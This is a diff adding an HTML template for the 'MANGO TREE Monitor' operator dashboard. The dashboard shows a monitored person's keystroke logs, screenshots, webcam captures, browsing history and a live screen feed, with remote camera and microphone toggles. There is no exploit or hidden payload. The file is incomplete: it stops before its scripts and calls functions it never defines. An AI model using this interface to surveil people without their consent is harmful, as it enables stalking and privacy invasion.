@@ -1,0 +1,2069 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MANGO TREE Monitor - {{ username }}</title>
+    
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- DataTables CSS -->
+    <link href="https://cdn.datatables.net/1.11.5/css/dataTables.bootstrap5.min.css" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    
+    <style>
+        .sidebar {
+            min-height: 100vh;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .nav-link {
+            color: #495057;
+            padding: 0.8rem 1rem;
+            border-radius: 0.25rem;
+            margin: 0.2rem 0;
+        }
+        .nav-link:hover, .nav-link.active {
+            background-color: #e9ecef;
+        }
+        .nav-link i {
+            width: 1.5rem;
+            text-align: center;
+            margin-right: 0.5rem;
+        }
+        #clock {
+            font-family: monospace;
+        }
+        .content-section {
+            display: none;
+        }
+        .content-section.active {
+            display: block;
+        }
+        .screenshot-grid img, .webcam-grid img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 0.5rem;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .screenshot-grid img:hover, .webcam-grid img:hover {
+            transform: scale(1.02);
+        }
+        .image-modal {
+            display: none;
+            position: fixed;
+            z-index: 1050;
+            padding: 20px;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.9);
+        }
+        .image-modal img {
+            max-width: 90%;
+            max-height: 90vh;
+            margin: auto;
+            display: block;
+        }
+        .image-modal .close {
+            position: absolute;
+            right: 25px;
+            top: 15px;
+            color: #f1f1f1;
+            font-size: 40px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .image-modal .timestamp {
+            position: absolute;
+            bottom: 20px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            color: white;
+            background-color: rgba(0,0,0,0.5);
+            padding: 10px;
+        }
+
+        /* Live Monitor Styles */
+        .feed-container {
+            margin: 20px 0;
+        }
+        .feed {
+            background: white;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            position: relative;
+        }
+        .feed-title {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .feed img {
+            width: 100%;
+            height: auto;
+            border-radius: 4px;
+            display: block;
+        }
+        .status-indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-left: 10px;
+            position: relative;
+        }
+        .status-indicator.connected {
+            background-color: #4CAF50;
+        }
+        .status-indicator.disconnected {
+            background-color: #f44336;
+        }
+        .status-indicator.connecting {
+            background-color: #ff9800;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        .error-overlay {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.8);
+            color: white;
+            text-align: center;
+            padding-top: 20%;
+            border-radius: 8px;
+            z-index: 10;
+        }
+        .error-overlay button {
+            margin-top: 15px;
+            padding: 8px 20px;
+            background: #4CAF50;
+            border: none;
+            color: white;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .error-overlay button:hover {
+            background: #45a049;
+        }
+        .status-tooltip {
+            display: none;
+            position: absolute;
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            white-space: nowrap;
+            top: -30px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 20;
+        }
+        .status-indicator:hover .status-tooltip {
+            display: block;
+        }
+        .audio-section {
+            background: #e9ecef;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        /* Home Section Styles */
+        .monitor-toggle {
+            transition: all 0.3s ease;
+        }
+        .monitor-toggle:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .status-pill {
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            font-weight: 500;
+        }
+        .status-pill.active {
+            background-color: #d1fae5;
+            color: #059669;
+        }
+        .status-pill.inactive {
+            background-color: #fee2e2;
+            color: #dc2626;
+        }
+        .timeline {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .timeline-item {
+            padding: 1rem;
+            border-left: 2px solid #e5e7eb;
+            margin-left: 1rem;
+            position: relative;
+        }
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: -0.5rem;
+            top: 1.25rem;
+            width: 1rem;
+            height: 1rem;
+            border-radius: 50%;
+            background: #fff;
+            border: 2px solid #3b82f6;
+        }
+        .captures-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1rem;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .capture-item {
+            position: relative;
+            border-radius: 0.5rem;
+            overflow: hidden;
+        }
+        .capture-item img {
+            width: 100%;
+            height: 100px;
+            object-fit: cover;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .capture-item img:hover {
+            transform: scale(1.05);
+        }
+        .capture-time {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 0.25rem;
+            font-size: 0.75rem;
+            text-align: center;
+        }
+        /* Custom scrollbar for timeline and captures */
+        .timeline::-webkit-scrollbar,
+        .captures-grid::-webkit-scrollbar {
+            width: 6px;
+        }
+        .timeline::-webkit-scrollbar-track,
+        .captures-grid::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 3px;
+        }
+        .timeline::-webkit-scrollbar-thumb,
+        .captures-grid::-webkit-scrollbar-thumb {
+            background: #888;
+            border-radius: 3px;
+        }
+        .timeline::-webkit-scrollbar-thumb:hover,
+        .captures-grid::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+
+        /* Chart styles */
+        .chart-container {
+            position: relative;
+            width: 100%;
+            height: 100%;
+        }
+
+        .no-data-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.9);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+        }
+
+        .no-data-message {
+            text-align: center;
+            color: #6c757d;
+        }
+
+        .chart-loader {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 20;
+        }
+
+        .chart-refresh {
+            opacity: 0.7;
+            transition: opacity 0.2s;
+        }
+
+        .chart-refresh:hover {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container-fluid">
+        <div class="row">
+            <!-- Sidebar -->
+            <div class="col-md-3 col-lg-2 px-0 bg-white sidebar">
+                <div class="d-flex flex-column align-items-center align-items-sm-start px-3 pt-4 text-white min-vh-100">
+                    <a href="/" class="d-flex align-items-center pb-3 mb-3 link-dark text-decoration-none border-bottom w-100">
+                        <span class="fs-5 fw-bold">MANGO TREE</span>
+                    </a>
+                    <div class="w-100 mb-3">
+                        <div class="text-muted small">Monitor Name</div>
+                        <div class="fw-bold text-dark">{{ username }}</div>
+                    </div>
+                    <div class="w-100 mb-3">
+                        <div class="text-muted small">System Time</div>
+                        <div id="clock" class="fw-bold text-dark">00:00:00</div>
+                    </div>
+
+                    <!-- Add username display in header for mobile -->
+                    <div class="d-block d-md-none w-100 mb-3 text-center">
+                        <div class="text-muted small">Logged in as</div>
+                        <div class="fw-bold text-dark">{{ username }}</div>
+                    </div>
+
+                    <ul class="nav nav-pills flex-column mb-sm-auto mb-0 align-items-center align-items-sm-start w-100" id="menu">
+                        <li class="nav-item w-100">
+                            <a href="#" class="nav-link active" data-section="home">
+                                <i class="fas fa-home"></i> Home
+                            </a>
+                        </li>
+                        <li class="nav-item w-100">
+                            <a href="#" class="nav-link" data-section="activity">
+                                <i class="fas fa-chart-line"></i> Activity Logs
+                            </a>
+                        </li>
+                        <li class="nav-item w-100">
+                            <a href="#" class="nav-link" data-section="website">
+                                <i class="fas fa-globe"></i> Website History
+                            </a>
+                        </li>
+                        <li class="nav-item w-100">
+                            <a href="#" class="nav-link" data-section="internet">
+                                <i class="fas fa-wifi"></i> Internet Usage
+                            </a>
+                        </li>
+                        <li class="nav-item w-100">
+                            <a href="#" class="nav-link" data-section="usb">
+                                <i class="fas fa-usb"></i> USB Usage
+                            </a>
+                        </li>
+                        <li class="nav-item w-100">
+                            <a href="#" class="nav-link" data-section="apps">
+                                <i class="fas fa-window-restore"></i> Application Usage
+                            </a>
+                        </li>
+                        <li class="nav-item w-100">
+                            <a href="#" class="nav-link" data-section="keystrokes">
+                                <i class="fas fa-keyboard"></i> Keystroke Logs
+                            </a>
+                        </li>
+                        <li class="nav-item w-100">
+                            <a href="#" class="nav-link" data-section="screenshots">
+                                <i class="fas fa-camera"></i> Screenshots
+                            </a>
+                        </li>
+                        <li class="nav-item w-100">
+                            <a href="#" class="nav-link" data-section="webcam">
+                                <i class="fas fa-video"></i> Webcam Captures
+                            </a>
+                        </li>
+                        <li class="nav-item w-100">
+                            <a href="#" class="nav-link" data-section="live">
+                                <i class="fas fa-broadcast-tower"></i> Live Monitor
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Main Content -->
+            <div class="col-md-9 col-lg-10 px-md-4 py-4">
+                <!-- Date-Time Filter -->
+                <div class="card mb-4">
+                    <div class="card-body">
+                        <form id="dateTimeFilter" class="row g-3 align-items-center" onsubmit="return false;">
+                            <div class="col-md-3">
+                                <label class="form-label">From Date</label>
+                                <input type="date" class="form-control" id="fromDate">
+                            </div>
+                            <div class="col-md-2">
+                                <label class="form-label">From Time</label>
+                                <input type="time" class="form-control" id="fromTime">
+                            </div>
+                            <div class="col-md-3">
+                                <label class="form-label">To Date</label>
+                                <input type="date" class="form-control" id="toDate">
+                            </div>
+                            <div class="col-md-2">
+                                <label class="form-label">To Time</label>
+                                <input type="time" class="form-control" id="toTime">
+                            </div>
+                            <div class="col-md-2">
+                                <label class="form-label">&nbsp;</label>
+                                <button type="button" onclick="applyFilters()" class="btn btn-primary w-100">Apply Filter</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+
+                <!-- Home Section -->
+                <div id="home-section" class="content-section active">
+                    <div class="row">
+                        <!-- Quick Stats -->
+                        <div class="col-12 mb-4">
+                            <div class="card">
+                                <div class="card-body">
+                                    <div class="row">
+                                        <div class="col-md-4">
+                                            <div class="d-flex align-items-center">
+                                                <i class="fas fa-globe fa-2x text-primary me-3"></i>
+                                                <div>
+                                                    <h6 class="mb-0">Websites Visited</h6>
+                                                    <h3 class="mb-0" id="websiteCount">0</h3>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-4">
+                                            <div class="d-flex align-items-center">
+                                                <i class="fas fa-window-restore fa-2x text-success me-3"></i>
+                                                <div>
+                                                    <h6 class="mb-0">Apps Used</h6>
+                                                    <h3 class="mb-0" id="appCount">0</h3>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-4">
+                                            <div class="d-flex align-items-center">
+                                                <i class="fas fa-clock fa-2x text-warning me-3"></i>
+                                                <div>
+                                                    <h6 class="mb-0">Active Time</h6>
+                                                    <h3 class="mb-0" id="activeTime">0h 0m</h3>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Monitoring Features -->
+                        <div class="col-12 mb-4">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h5 class="card-title mb-0">Monitoring Features</h5>
+                                </div>
+                                <div class="card-body">
+                                    <div class="row">
+                                        <div class="col-md-4 mb-3">
+                                            <div class="monitor-toggle d-flex justify-content-between align-items-center p-3 border rounded">
+                                                <div>
+                                                    <i class="fas fa-desktop me-2"></i>
+                                                    <span>Screen Capture</span>
+                                                </div>
+                                                <div class="d-flex align-items-center">
+                                                    <span class="status-pill active me-2">Active</span>
+                                                    <div class="form-check form-switch">
+                                                        <input class="form-check-input" type="checkbox" id="screenToggle" checked>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-4 mb-3">
+                                            <div class="monitor-toggle d-flex justify-content-between align-items-center p-3 border rounded">
+                                                <div>
+                                                    <i class="fas fa-camera me-2"></i>
+                                                    <span>Webcam Capture</span>
+                                                </div>
+                                                <div class="d-flex align-items-center">
+                                                    <span class="status-pill active me-2">Active</span>
+                                                    <div class="form-check form-switch">
+                                                        <input class="form-check-input" type="checkbox" id="webcamToggle" checked>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-4 mb-3">
+                                            <div class="monitor-toggle d-flex justify-content-between align-items-center p-3 border rounded">
+                                                <div>
+                                                    <i class="fas fa-keyboard me-2"></i>
+                                                    <span>Keystroke Logger</span>
+                                                </div>
+                                                <div class="d-flex align-items-center">
+                                                    <span class="status-pill active me-2">Active</span>
+                                                    <div class="form-check form-switch">
+                                                        <input class="form-check-input" type="checkbox" id="keystrokeToggle" checked>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-4 mb-3">
+                                            <div class="monitor-toggle d-flex justify-content-between align-items-center p-3 border rounded">
+                                                <div>
+                                                    <i class="fas fa-usb me-2"></i>
+                                                    <span>USB Monitor</span>
+                                                </div>
+                                                <div class="d-flex align-items-center">
+                                                    <span class="status-pill active me-2">Active</span>
+                                                    <div class="form-check form-switch">
+                                                        <input class="form-check-input" type="checkbox" id="usbToggle" checked>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-4 mb-3">
+                                            <div class="monitor-toggle d-flex justify-content-between align-items-center p-3 border rounded">
+                                                <div>
+                                                    <i class="fas fa-wifi me-2"></i>
+                                                    <span>Internet Monitor</span>
+                                                </div>
+                                                <div class="d-flex align-items-center">
+                                                    <span class="status-pill active me-2">Active</span>
+                                                    <div class="form-check form-switch">
+                                                        <input class="form-check-input" type="checkbox" id="internetToggle" checked>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-4 mb-3">
+                                            <div class="monitor-toggle d-flex justify-content-between align-items-center p-3 border rounded">
+                                                <div>
+                                                    <i class="fas fa-window-restore me-2"></i>
+                                                    <span>App Monitor</span>
+                                                </div>
+                                                <div class="d-flex align-items-center">
+                                                    <span class="status-pill active me-2">Active</span>
+                                                    <div class="form-check form-switch">
+                                                        <input class="form-check-input" type="checkbox" id="appToggle" checked>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Charts Row -->
+                        <div class="col-md-6 mb-4">
+                            <div class="card h-100">
+                                <div class="card-header d-flex justify-content-between align-items-center">
+                                    <h5 class="card-title mb-0">Application Usage</h5>
+                                    <div class="chart-refresh">
+                                        <button class="btn btn-sm btn-outline-secondary" onclick="updateAppUsageChart()">
+                                            <i class="fas fa-sync-alt"></i>
+                                        </button>
+                                    </div>
+                                </div>
+                                <div class="card-body">
+                                    <div class="chart-container" style="height: 300px; position: relative;">
+                                        <canvas id="appUsageChart"></canvas>
+                                        <div id="appUsageNoData" class="no-data-overlay" style="display: none;">
+                                            <div class="no-data-message">
+                                                <i class="fas fa-chart-pie fa-2x mb-2"></i>
+                                                <p>No application usage data available</p>
+                                            </div>
+                                        </div>
+                                        <div id="appUsageLoader" class="chart-loader" style="display: none;">
+                                            <div class="spinner-border text-primary" role="status">
+                                                <span class="visually-hidden">Loading...</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-md-6 mb-4">
+                            <div class="card h-100">
+                                <div class="card-header">
+                                    <h5 class="card-title mb-0">Internet Usage</h5>
+                                </div>
+                                <div class="card-body">
+                                    <div style="height: 300px;">
+                                        <canvas id="internetUsageChart"></canvas>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Recent Activity -->
+                        <div class="col-md-8 mb-4">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h5 class="card-title mb-0">Recent Activity</h5>
+                                </div>
+                                <div class="card-body">
+                                    <div class="timeline" id="activityTimeline">
+                                        <!-- Timeline items will be loaded here -->
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Latest Captures -->
+                        <div class="col-md-4 mb-4">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h5 class="card-title mb-0">Latest Captures</h5>
+                                </div>
+                                <div class="card-body">
+                                    <div class="captures-grid" id="latestCaptures">
+                                        <!-- Latest captures will be loaded here -->
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Activity Logs Section -->
+                <div id="activity-section" class="content-section">
+                    <h2 class="mb-4">Activity Logs</h2>
+                    <div class="card">
+                        <div class="card-body">
+                            <table id="activity-table" class="table table-striped" style="width:100%">
+                                <thead>
+                                    <tr>
+                                        <th>Time</th>
+                                        <th>Activity Type</th>
+                                        <th>Details</th>
+                                    </tr>
+                                </thead>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Website History Section -->
+                <div id="website-section" class="content-section">
+                    <h2 class="mb-4">Website History</h2>
+                    <div class="card">
+                        <div class="card-body">
+                            <table id="website-table" class="table table-striped" style="width:100%">
+                                <thead>
+                                    <tr>
+                                        <th>Time</th>
+                                        <th>Website</th>
+                                        <th>Duration</th>
+                                        <th>Browser</th>
+                                    </tr>
+                                </thead>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Internet Usage Section -->
+                <div id="internet-section" class="content-section">
+                    <h2 class="mb-4">Internet Usage</h2>
+                    <div class="card">
+                        <div class="card-body">
+                            <table id="internet-table" class="table table-striped" style="width:100%">
+                                <thead>
+                                    <tr>
+                                        <th>Application</th>
+                                        <th>Data Sent</th>
+                                        <th>Data Received</th>
+                                        <th>Total Usage</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- USB Usage Section -->
+                <div id="usb-section" class="content-section">
+                    <h2 class="mb-4">USB Usage</h2>
+                    <div class="card">
+                        <div class="card-body">
+                            <table id="usb-table" class="table table-striped" style="width:100%">
+                                <thead>
+                                    <tr>
+                                        <th>Time</th>
+                                        <th>Event</th>
+                                        <th>Device Name</th>
+                                        <th>Status</th>
+                                    </tr>
+                                </thead>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Application Usage Section -->
+                <div id="apps-section" class="content-section">
+                    <h2 class="mb-4">Application Usage</h2>
+                    <div class="card">
+                        <div class="card-body">
+                            <table id="apps-table" class="table table-striped" style="width:100%">
+                                <thead>
+                                    <tr>
+                                        <th>Application</th>
+                                        <th>Total Time</th>
+                                        <th>Last Used</th>
+                                    </tr>
+                                </thead>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Keystroke Logs Section -->
+                <div id="keystrokes-section" class="content-section">
+                    <h2 class="mb-4">Keystroke Logs</h2>
+                    <div class="card">
+                        <div class="card-body">
+                            <table id="keystrokes-table" class="table table-striped" style="width:100%">
+                                <thead>
+                                    <tr>
+                                        <th></th>
+                                        <th>Date</th>
+                                        <th>Application</th>
+                                        <th>Key Count</th>
+                                    </tr>
+                                </thead>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Screenshots Section -->
+                <div id="screenshots-section" class="content-section">
+                    <h2 class="mb-4">Screenshots</h2>
+                    <div class="card">
+                        <div class="card-body">
+                            <div class="row screenshot-grid" id="screenshot-grid">
+                                <!-- Screenshots will be loaded here -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Webcam Captures Section -->
+                <div id="webcam-section" class="content-section">
+                    <h2 class="mb-4">Webcam Captures</h2>
+                    <div class="card">
+                        <div class="card-body">
+                            <div class="row webcam-grid" id="webcam-grid">
+                                <!-- Webcam captures will be loaded here -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Live Monitor Section -->
+                <div id="live-section" class="content-section">
+                    <h2 class="mb-4">Live Monitor</h2>
+                    <div class="live-container">
+                        <!-- Main Screen Feed -->
+                        <div class="main-feed" id="screen-feed">
+                            <div class="feed-title">
+                                <h3 class="h5 mb-0">Live Screen</h3>
+                                <div class="d-flex align-items-center">
+                                    <button class="btn btn-sm btn-outline-secondary me-2" onclick="toggleFullscreen('screen-feed')">
+                                        <i class="fas fa-expand"></i>
+                                    </button>
+                                    <span class="status-indicator connecting" id="screen-status">
+                                        <span class="status-tooltip">Connecting...</span>
+                                    </span>
+                                </div>
+                            </div>
+                            <div class="feed-content">
+                                <img src="/live/screen_feed" alt="Screen Feed" onerror="handleStreamError(this, 'screen')">
+                                <div class="error-overlay" id="screen-error">
+                                    <p>Screen feed disconnected</p>
+                                    <p class="error-message"></p>
+                                    <button onclick="reconnectStream('screen')">Reconnect</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Picture-in-Picture Webcam -->
+                        <div class="pip-feed" id="camera-feed">
+                            <div class="feed-header">
+                                <div class="d-flex align-items-center">
+                                    <button class="btn btn-sm btn-primary me-2" id="toggleCamera">
+                                        <i class="fas fa-video"></i> Turn Camera On
+                                    </button>
+                                    <span class="status-indicator disconnected" id="camera-status">
+                                        <span class="status-tooltip">Camera Off</span>
+                                    </span>
+                                </div>
+                                <div class="pip-controls">
+                                    <button class="btn btn-sm btn-link text-dark" onclick="togglePiP()">
+                                        <i class="fas fa-arrows-alt"></i>
+                                    </button>
+                                </div>
+                            </div>
+                            <div id="camera-placeholder" class="text-center py-5 bg-light">
+                                <i class="fas fa-video-slash fa-3x text-muted"></i>
+                                <p class="mt-2 text-muted">Camera is turned off</p>
+                            </div>
+                            <img src="" alt="Camera Feed" style="display: none;" id="camera-feed-img" onerror="handleStreamError(this, 'camera')">
+                            <div class="error-overlay" id="camera-error">
+                                <p>Camera feed disconnected</p>
+                                <p class="error-message"></p>
+                                <button onclick="reconnectStream('camera')">Reconnect</button>
+                            </div>
+                        </div>
+
+                        <!-- Audio Controls -->
+                        <div class="audio-controls">
+                            <div class="d-flex align-items-center justify-content-between bg-white p-3 rounded shadow-sm">
+                                <div class="d-flex align-items-center">
+                                    <button class="btn btn-link text-dark me-3" onclick="toggleMicrophone()" id="mic-toggle">
+                                        <i class="fas fa-microphone fa-lg"></i>
+                                    </button>
+                                    <div class="audio-meter">
+                                        <div class="meter-bar" id="audio-level"></div>
+                                    </div>
+                                </div>
+                                <div class="audio-settings">
+                                    <select class="form-select form-select-sm" id="audio-device" onchange="changeAudioDevice()">
+                                        <option value="">Loading devices...</option>
+                                    </select>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <style>
+                    /* Live Monitor Styles */
+                    .live-container {
+                        position: relative;
+                        background: #f8f9fa;
+                        border-radius: 8px;
+                        padding: 20px;
+                        min-height: 70vh;
+                    }
+
+                    .main-feed {
+                        width: 100%;
+                        background: white;
+                        border-radius: 8px;
+                        overflow: hidden;
+                        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+                    }
+
+                    .feed-title {
+                        display: flex;
+                        justify-content: space-between;
+                        align-items: center;
+                        padding: 15px;
+                        border-bottom: 1px solid #eee;
+                    }
+
+                    .feed-content {
+                        position: relative;
+                        background: #000;
+                    }
+
+                    .feed-content img {
+                        width: 100%;
+                        height: auto;
+                        display: block;
+                    }
+
+                    .pip-feed {
+                        position: absolute;
+                        top: 40px;
+                        right: 40px;
+                        width: 240px;
+                        background: white;
+                        border-radius: 8px;
+                        overflow: hidden;
+                        box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                        transition: all 0.3s ease;
+                        z-index: 100;
+                    }
+
+                    .pip-feed.expanded {
+                        position: fixed;
+                        top: 50%;
+                        left: 50%;
+                        transform: translate(-50%, -50%);
+                        width: 80%;
+                        max-width: 1200px;
+                        height: auto;
+                        z-index: 1000;
+                    }
+
+                    .pip-feed .feed-header {
+                        display: flex;
+                        justify-content: space-between;
+                        align-items: center;
+                        padding: 8px;
+                        background: rgba(255,255,255,0.9);
+                        z-index: 1;
+                    }
+
+                    .pip-feed img {
+                        width: 100%;
+                        height: auto;
+                        display: block;
+                    }
+
+                    .pip-controls {
+                        display: flex;
+                        gap: 5px;
+                    }
+
+                    .pip-controls button {
+                        padding: 2px 6px;
+                        color: #333;
+                    }
+
+                    #camera-placeholder {
+                        padding: 40px 20px;
+                        background: #f8f9fa;
+                        border-radius: 0 0 8px 8px;
+                    }
+
+                    /* Rest of the styles remain unchanged */
+                </style>
+
+                <script>
+                    // Audio state
+                    let isAudioEnabled = false;
+                    let audioLevelInterval = null;
+
+                    // Initialize audio devices
+                    async function initializeAudio() {
+                        try {
+                            // Get available devices
+                            const response = await fetch('/api/audio/devices');
+                            const data = await response.json();
+                            
+                            // Update device selector
+                            const select = document.getElementById('audio-device');
+                            select.innerHTML = data.devices.map(device => 
+                                `<option value="${device.index}">${device.name}</option>`
+                            ).join('');
+                            
+                            // Start audio level monitoring
+                            startAudioLevelMonitoring();
+                            
+                        } catch (err) {
+                            console.error('Error initializing audio:', err);
+                            document.getElementById('mic-toggle').classList.add('disabled');
+                        }
+                    }
+
+                    // Toggle microphone
+                    async function toggleMicrophone() {
+                        const micButton = document.getElementById('mic-toggle');
+                        const icon = micButton.querySelector('i');
+                        
+                        try {
+                            const response = await fetch('/api/audio/toggle', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    enabled: !isAudioEnabled
+                                })
+                            });
+                            
+                            const data = await response.json();
+                            if (data.success) {
+                                isAudioEnabled = !isAudioEnabled;
+                                icon.className = isAudioEnabled ? 'fas fa-microphone fa-lg' : 'fas fa-microphone-slash fa-lg';
+                                micButton.classList.toggle('text-danger', !isAudioEnabled);
+                                
+                                if (isAudioEnabled) {
+                                    startAudioLevelMonitoring();
+                                } else {
+                                    stopAudioLevelMonitoring();
+                                }
+                            }
+                        } catch (err) {
+                            console.error('Error toggling microphone:', err);
+                        }
+                    }
+
+                    // Change audio device
+                    async function changeAudioDevice() {
+                        const deviceId = document.getElementById('audio-device').value;
+                        try {
+                            const response = await fetch('/api/audio/device', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    device_index: parseInt(deviceId)
+                                })
+                            });
+                            
+                            const data = await response.json();
+                            if (!data.success) {
+                                console.error('Failed to change audio device');
+                            }
+                        } catch (err) {
+                            console.error('Error changing audio device:', err);
+                        }
+                    }
+
+                    // Start audio level monitoring
+                    function startAudioLevelMonitoring() {
+                        if (audioLevelInterval) {
+                            clearInterval(audioLevelInterval);
+                        }
+                        
+                        audioLevelInterval = setInterval(async () => {
+                            try {
+                                const response = await fetch('/api/audio/level');
+                                const data = await response.json();
+                                document.getElementById('audio-level').style.width = `${data.level}%`;
+                            } catch (err) {
+                                console.error('Error getting audio level:', err);
+                            }
+                        }, 100);
+                    }
+
+                    // Stop audio level monitoring
+                    function stopAudioLevelMonitoring() {
+                        if (audioLevelInterval) {
+                            clearInterval(audioLevelInterval);
+                            audioLevelInterval = null;
+                        }
+                        document.getElementById('audio-level').style.width = '0%';
+                    }
+
+                    // Toggle Picture-in-Picture
+                    function togglePiP() {
+                        const pipFeed = document.getElementById('camera-feed');
+                        pipFeed.classList.toggle('expanded');
+                    }
+
+                    // Toggle Camera
+                    function toggleCamera() {
+                        const pipFeed = document.getElementById('camera-feed');
+                        const img = pipFeed.querySelector('img');
+                        if (img.style.display === 'none') {
+                            img.style.display = 'block';
+                            pipFeed.querySelector('.fa-video').style.color = '#000';
+                        } else {
+                            img.style.display = 'none';
+                            pipFeed.querySelector('.fa-video').style.color = '#f44336';
+                        }
+                    }
+
+                    // Toggle Fullscreen
+                    function toggleFullscreen(elementId) {
+                        const element = document.getElementById(elementId);
+                        element.classList.toggle('fullscreen');
+                        const icon = element.querySelector('.fa-expand');
+                        icon.classList.toggle('fa-expand');
+                        icon.classList.toggle('fa-compress');
+                    }
+
+                    // Initialize when live section becomes active
+                    document.addEventListener('DOMContentLoaded', function() {
+                        const navLinks = document.querySelectorAll('.nav-link');
+                        navLinks.forEach(link => {
+                            link.addEventListener('click', function(e) {
+                                const section = this.getAttribute('data-section');
+                                if (section === 'live') {
+                                    // Initialize screen stream only
+                                    reconnectStream('screen');
+                                } else if (streamStatus.camera.enabled) {
+                                    // Turn off camera when leaving live section
+                                    toggleCameraBtn.click();
+                                }
+                            });
+                        });
+
+                        // Check connection status periodically when live section is active
+                        setInterval(() => {
+                            const liveSection = document.getElementById('live-section');
+                            if (liveSection && liveSection.classList.contains('active')) {
+                                checkImageLoading('screen');
+                                if (streamStatus.camera.enabled) {
+                                    checkImageLoading('camera');
+                                }
+                            }
+                        }, 1000);
+                    });
+                </script>
+            </div>
+        </div>
+    </div>
+
+    <!-- Image Modal -->
+    <div id="imageModal" class="image-modal">
+        <span class="close">&times;</span>
+        <img id="modalImage">
+        <div id="modalTimestamp" class="timestamp"></div>
+    </div>
+
+    <!-- Scripts -->
